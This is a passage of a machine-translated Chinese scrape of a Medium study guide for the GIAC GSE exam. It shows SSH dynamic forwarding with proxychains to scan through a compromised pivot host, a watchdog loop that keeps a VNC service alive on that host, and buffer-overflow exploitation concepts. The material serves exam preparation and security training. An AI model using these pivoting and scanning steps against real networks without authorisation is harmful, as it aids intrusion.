kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">现在让我们运行动态转发，并开始跨多个端口再次将我们的扫描转发到Google DNS。我们应该看到TCP端口443和53重新打开。我们将使用“-D”开关进行动态转发，使用“-f”开关确保SSH进程在后台运行，使用“-N”开关确保不执行远程命令(例如，除了扫描，我们不会使用隧道进行任何操作，而不是交互式shell)。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="c0a8" class="lf lg it mx b gy nb nc l nd ne">#edit the proxychains file adding socks5 127.0.0.1 6500<br/>vim /etc/proxychains.conf<br/>ssh -D -f -N 127.0.0.1:6500 msfadmin@&lt;pivothost&gt;<br/>#run nmap through proxy chains<br/>proxychains nmap -Pn</span></pre><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi rb"><img src="../Images/e60e56d6193ac6e87c56df3d71282cd5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bazZEAl9h3m5mNlg00esJw.png"/></div></div></figure><p id="3b72" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">恭喜世界上最慢的端口扫描。然而，如果您没有能力将工具添加到您受损的枢纽主机中；如果你不能使用像sshuttle或metasploit的VPN这样的L2 VPN，这实际上是你剩下的东西。无论你怎么看，旋转都是一个缓慢的过程。</p><p id="5289" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">在不稳定的系统中旋转的注意事项</em>:偶尔你会在一个主机上有一个外壳或者一个你需要运行但可能会停止的服务。其中一个众所周知的例子是RealVNC服务，它在演示模式下超时。显然还有更好的远程功能，但假设这是您必须使用的全部功能。在pivot主机上，您尝试使用的一个技巧是，如果您不依赖任何实时传输，使用一个简单的看门狗脚本来重新启动它。这是我的一句俏皮话:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="2eef" class="lf lg it mx b gy nb nc l nd ne">#restart a service if it is down checking every 3 seconds<br/>while sleep 3; do if [ `systemctl is-active vncserver` == "inactive" ]; then echo "down" &amp;&amp; eval "systemctl start vncserver@1"; fi; sleep 1; done</span></pre><p id="9374" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">正如你在<a class="ae le" href="https://medium.com/datadriveninvestor/study-guide-for-the-gse-giac-security-expert-part-1-da6ca4e4da7a" rel="noopener">第1部分</a>中看到的，当另一个命令有特殊字符时，我们使用eval命令将它包装成字符串。</p><h2 id="c759" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">关于GSE范围内缓冲区溢出的说明</h2><p id="4e35" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">与GXPN不同，GSE核心不要求您执行特定的堆栈开发。即使有，你最多也只能使用模板脚本和一个附加了Mona.py的GDB或免疫调试器。从理论的角度来看，所有GCIH认证人员都需要了解EIP/RIP接管并重定向其控制流的标准概念，以便通过直接Jmp在NOP Sled中着陆，或者可能使用非ASLR支持的ROP小工具进行指令，如POP POP RET方法。如果您对此感到生疏或者不理解这些概念，我推荐以下资源来帮助解释和使用它:</p><ul class=""><li id="b452" class="md me it kk b kl km ko kp kr mf kv mg kz mh ld mi mj mk ml bi translated">佩琉斯的简单BOF</li><li id="252d" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated"><a class="ae le" href="https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/" rel="noopener ugc nofollow" target="_blank"> Metasploit Unleashed(已经更新为包含ROP小工具)</a></li><li id="dddf" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated"><a class="ae le" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" rel="noopener ugc nofollow" target="_blank"> Corlean的堆栈溢出教程第1部分和第2部分</a></li></ul><p id="02f8" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">您可能仍然需要在资格考试和实验室考试中使用类似于<strong class="kk iu"> pattern_offset.rb </strong>和<strong class="kk iu"> pattern_create.rb </strong>的脚本，以便将其插入到框架脚本中，或者使用Python内联并将字符打印到参数或其他用户输入缓冲区中，从而导致段错误并找到x86堆栈的偏移地址空间。</p><p id="7d72" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">关于Python 2与3内联语句和本地库的小说明:</em></p><p id="d311" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">根据您的用例，您可能需要改变在Python 2和3中构建语句的方式，并了解常见用例的新模块。例如，现在print语句必须用函数括号括起来:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi rc"><img src="../Images/aba8736a6a05ee907846465367188ec9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i1hPj9R69TeEZBex5gpfQw.png"/></div></div></figure><p id="9690" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在python 2中，您可以使用后跟乘数表达式的常规打印语句。现在，在应用乘数之前，您必须将print语句作为一个函数包含在内。另一个常见功能变化的例子是能够从Kali VM向主机桌面提供文件。Python2的SimpleHttpServer现在位于另一个名为“http.server”的模块中，如下所示:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi rd"><img src="../Images/b7e7d7f1274639f1661821acc95d7afc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1_aOFM7QjaesGYUeo82okA.png"/></div></div></figure><p id="97f6" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">请密切关注考试和实验中运行的脚本，因为有些脚本可能需要Python 2或3。</p><p id="0eba" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">为了运行这两个BOF助手ruby脚本，Kali 2018.1映像将它们放在<strong class="kk iu">/usr/share/metasploit-framework/tools/</strong>下。从网络和主机取证的角度看是一个辩护人；在日志中执行时，您应该知道NOPsleds、可能的shell有效负载模式和主机命令等效项。这些都列在你的GCIA书里。</p><h2 id="2077" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">关闭</h2><p id="80f8" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">这是一篇很长的文章，我感谢你与我分享这段旅程。希望这对于GSE实验室来说足够了，我将能够带着第3部分回来，强调我的经验(在他们允许我们讨论的范围内)以及我将向未来的候选人传递什么建议。如果你仍然想知道你还能做些什么，考虑创建一个Github并抛出任何你认为可能有帮助的有用的脚本和一行程序。这也将有助于安全社区，有时那些分叉你的代码的人会给你信任。像往常一样，如果你需要任何网络安全需求，你可以在www.scissecurity.com<a class="ae le" href="http://www.scissecurity.com" rel="noopener ugc nofollow" target="_blank">找到我。</a></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi re"><img src="../Images/7ffbbf5c1031699ada9dad226ddd73ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*TwgpBmEaEOAGF5NxaqVPJg.png"/></div><figcaption class="rf rg gj gh gi rh ri bd b be z dk">Github Page Example</figcaption></figure><p id="6b0d" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><strong class="kk iu">访问专家视图— </strong> <a class="ae le" href="https://datadriveninvestor.com/ddi-intel" rel="noopener ugc nofollow" target="_blank"> <strong class="kk iu">订阅DDI英特尔</strong> </a></p></div></div>    
</body>
</html>